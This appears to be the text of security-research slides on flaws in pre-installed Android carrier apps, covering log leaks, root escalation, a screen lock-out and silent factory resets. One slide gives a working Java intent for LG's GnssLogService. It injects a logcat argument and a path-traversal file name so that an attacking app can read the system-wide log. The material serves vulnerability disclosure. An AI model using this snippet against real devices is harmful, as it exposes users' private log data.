Vulnerable Out of the Box: 
An Evaluation of Android Carrier Devices
Ryan Johnson - Kryptowire
Angelos Stavrou - Kryptowire
Why Look for Cyber Threats?
Aggressive data collection
– Exfiltration of sensitive user-data to China (Adups)
– Sensitive data collection (OnePlus 5)
Remote system compromise
– System compromise from insecure network 
communications (Ragentek)
User data disclosure due to vendor modifications
– Samsung leaking log data (CVE-2017-7978)
– MediaTek leaking log data (CVE-2016-10135)
Local privilege escalation to the “root” user
– Alcatel A30 (former Amazon Prime Exclusive Device)
– Leagoo P1
– Privileged EngineerMode app (OnePlus 5)
– Android 4.4 devices with a MediaTek chipset
2
Pre-installed Apps and Vendor OS Modification
Android devices contain a set of pre-installed apps
– May not be available on Google Play
– Some apps cannot be disabled
Pre-installed apps can be malicious and/or insecure
– Insecure apps can be locally or remotely exploited
– Malicious apps can provide “backdoor” functionality
and may exfiltrate sensitive user data
Vendors generally modify Google’s official Android 
code to provide custom behavior
– (Un)intentionally expose sensitive capabilities
– Privileged platform apps

App Components
Fundamental functional blocks of an Android app
– Activity
– Broadcast Receiver
– Service
– Content Provider
Declared in the app’s manifest file
May provide accessible entry-points into an app for other apps to exploit by using 
intents which are a message-like abstraction for communication within between apps
– Contains Intent-specific fields and potentially embedded data
4
Exported Application Components
Exported components are accessible to any process on the device
– Regulated by the android:exported and android:permission app component attributes
Android OS will export components, by default, if the app component does not use the 
android:exported attribute and declares at least one intent-filter
5
DMInstallerService
will be exported by default
Threat Model
A low-privilege third-party app is installed on the device via app repackaging, phishing, 
remote exploit, etc.
– Possibly, the READ_EXTERNAL_STORAGE permission is needed
– A malicious app without malicious permissions

Exposing User Data Through Logcat Logs
Third-party Android apps cannot read the system-wide 
logcat log since Android 4.1 due to it containing sensitive 
user data
– Can only read the log messages they write
Pre-installed apps can expose log data to other apps
– Generally written to external storage (SD card)
Any app with the READ_EXTERNAL_STORAGE
permission can read from external storage 
(i.e., SD card)
–
Contains the user’s pictures, downloads, and arbitrary files

LG – Read System-wide Logcat Log Via 
Command Line Argument Injection
Default command the com.lge.gnsslogcat app executes is logcat -v threadtime -s 
GpsLocationProvider:V LocationManagerService:V GnssLogService:V
Attacking app needs to create a named file and change the permissions of it and its private directory 
The intent changes the command to logcat -v threadtime -s GpsLocationProvider:V
LocationManagerService:V GnssLogService:V *:V Hidden:V
15
Intent i = new Intent("com.lge.gnsslogcat");
i.setClassName("com.lge.gnsslogcat", "com.lge.gnsslogcat.GnssLogService");
i.putExtra("modulename", "GnssLogService");
i.putExtra("start", true);
i.putExtra("logfilename", "../../../../data/data/com.attacking.app/logcat.txt");
ArrayList darkness = new ArrayList();
darkness.add("*:V Hidden");
i.putStringArrayListExtra("tags", darkness);
startService(i);
LG – Lock The User Out of Their Device
Screen lock is unresponsive except for making emergency calls
– Affects LG G6, LG Q6, LG X Power 2, and LG Phoenix 2
– Lock is active in safe mode
com.lge.CMCC_DM_PARTIALLY_LOCK action string
– Dynamically-registered by the com.android.systemui app
– Writes two values to the system settings and locks the screen
If ADB is enabled prior to the screen lock, a user can remove 
the screen lock by sending a particular broadcast intent
– Otherwise, a factory reset is required to recover the device
16
Programmatic Factory Reset
A “factory reset” wipes all user data and 
apps from the device
Facilitated by privileged pre-installed apps
– Requires a co-located zero-permission app
– Does not require any user intervention
User data and app that are not externally 
backed-up is lost during a factory reset
